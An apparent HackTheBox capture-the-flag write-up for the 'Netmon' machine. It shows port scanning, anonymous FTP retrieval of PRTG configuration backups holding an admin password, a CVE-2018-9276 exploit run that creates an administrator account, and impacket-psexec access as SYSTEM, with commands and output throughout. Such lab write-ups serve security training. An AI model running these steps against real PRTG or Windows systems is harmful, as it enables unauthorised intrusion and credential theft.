---
title: "Netmon"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Netmon

![](../assets/Pasted%20image%2020250508134550.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 13:47 CEST
Nmap scan report for 10.10.10.152
Host is up (0.042s latency).
Not shown: 62818 closed tcp ports (reset), 2704 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1m30s, deviation: 0s, median: 1m29s
| smb2-time: 
|   date: 2025-05-08T11:50:32
|_  start_date: 2025-05-08T11:48:21

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   41.88 ms 10.10.14.1
2   42.26 ms 10.10.10.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.58 seconds
```

The webpage shows a [PRTG Network Monitor (NETMON)](https://www.paessler.com/prtg) solution.

![](../assets/Pasted%20image%2020250508135810.png)

The `ftp` can be accessed anonymously and the `Windows` folder contains `PRTG Configuration.dat` with passwords.

```shell
$ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54567|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
ftp> cd windows
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||54568|)
150 Opening ASCII mode data connection.
11-20-16  09:53PM       <DIR>          ADFS
...
02-25-19  10:54PM              1189697 PRTG Configuration.dat

```

```shell
cat PRTG\ Configuration.dat | grep -C 10 password
...
<login>
  prtgadmin
</login>
<name>
  PRTG System Administrator
</name>
<ownerid>
  100
</ownerid>
<password>
  <flags>
	<encrypted/>
  </flags>
  <cell col="0" crypt="PRTG">
	JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
  </cell>
  <cell col="1" crypt="PRTG">
	OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
  </cell>
</password>
```

Nothing. Searching in the official documentation, we find [this article](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) and it says:

![](../assets/Pasted%20image%2020250508180130.png)

So, using the `ftp` access:

![](../assets/Pasted%20image%2020250508180227.png)

Get the three files and `grep password` on them:

```shell
cat PRTG\ Configuration.old.bak | grep -C 5 password  
  0
</dbauth>
<dbcredentials>
  0
</dbcredentials>
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

The credential doesn't work on the login form. Trying `2019` instead works.

![](../assets/Pasted%20image%2020250508181026.png)

There is an article explaining that RCE can be achieved using the notification system, and `searchsploit` has the script.

![](../assets/Pasted%20image%2020250508181944.png)

```shell
$ ./46527.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=ezZEMTY5NTVELTk5MzctNDE0RS05RUZFLUU0MTZBMDE0RjQ1RX0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.                                                                                                             
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'               

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
```

You can check the user with `nxc`:

![](../assets/Pasted%20image%2020250508182032.png)

```shell
$ impacket-psexec pentest:'P3nT3st!'@10.10.10.152
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file KCrmulCz.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service fcVl on 10.10.10.152.....
[*] Starting service fcVl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Post Exploitation

Get the flags:

```shell
C:\Users\Public\Desktop> type user.txt
0fe81dbc5fcd232892dc3c5b7fd24fcf

C:\Users\Administrator\Desktop> ype root.txt
6984b9873bd41d7af69204c3999c0d41
```
